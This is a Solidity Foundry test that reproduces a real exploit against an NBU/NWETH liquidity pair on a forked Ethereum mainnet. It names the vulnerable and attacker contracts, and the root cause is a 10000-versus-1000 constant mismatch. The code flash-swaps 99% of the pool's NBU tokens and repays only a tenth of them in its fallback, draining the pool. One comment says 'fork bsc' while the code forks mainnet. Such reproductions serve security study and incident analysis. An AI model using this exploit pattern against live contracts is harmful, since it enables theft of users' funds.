// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IERC20Custom {
    function transfer(address, uint256) external;
}

/*
    Vulnerable contract: https://etherscan.io/address/0xa14660a33cc608b902f5bb49c8213bd4c8a4f4ca#code unverified contract
    root cause: inconsistent value in the code, 10000 vs 1000.
    Attacker contract: 0x5676e585bf16387bc159fd4f82416434cda5f1a3*/
contract ContractTest is Test {
    address public pair = 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62; //NWETH/NBU
    address public nbu = 0xEB58343b36C7528F23CAAe63a150240241310049;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 13_225_516); //fork bsc at block 13225516
    }

    function testExploit() public {
        console.log("Before exploiting", IERC20(nbu).balanceOf(address(this)));

        uint256 amount = IERC20(nbu).balanceOf(pair) * 99 / 100;

        IUniswapV2Pair(pair).swap(0, amount, address(this), abi.encodePacked(amount));

        console.log("After exploiting", IERC20(nbu).balanceOf(address(this)));
    }

    fallback() external {
        IERC20Custom(nbu).transfer(pair, IERC20(nbu).balanceOf(address(this)) / 10);
    }
}
